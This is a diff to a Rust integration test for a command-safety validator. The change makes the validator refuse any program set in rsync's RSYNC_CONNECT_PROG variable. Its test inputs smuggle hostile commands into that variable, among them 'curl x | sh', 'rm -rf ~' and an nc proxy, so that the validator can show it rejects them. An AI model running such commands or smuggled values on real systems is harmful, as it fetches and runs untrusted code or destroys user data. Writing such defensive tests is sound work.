@@ -746,8 +746,10 @@ mod integration_tests {
     /// The second audit: build tools, pagers, prompts, editors and config locations. Each pair is
     /// the variable with a foreign value, refused, and with a benign one, still approved.
     #[test]
-    fn the_program_rsync_connects_through_is_judged_as_a_command() {
+    fn any_program_rsync_would_run_to_reach_a_daemon_is_refused() {
         for cmd in [
+            "RSYNC_CONNECT_PROG=id rsync rsync://x/foo dst/",
+            "RSYNC_CONNECT_PROG=cat rsync ./src/ ./dst/",
             "RSYNC_CONNECT_PROG='ssh proxy nc %H 873' rsync host::mod/ ./dst/",
             "RSYNC_CONNECT_PROG='curl x | sh' rsync host::mod/ ./dst/",
             "env RSYNC_CONNECT_PROG='rm -rf ~' rsync ./src/ ./dst/",
@@ -755,7 +757,8 @@ mod integration_tests {
         ] {
             assert!(!crate::is_safe_command(cmd), "{cmd}");
         }
-        assert!(crate::is_safe_command("RSYNC_CONNECT_PROG=cat rsync ./src/ ./dst/"));
+        assert!(crate::is_safe_command("RSYNC_CONNECT_PROG= rsync rsync://x/foo dst/"));
+        assert!(crate::is_safe_command("rsync rsync://x/foo dst/"));
     }
 
     #[test]
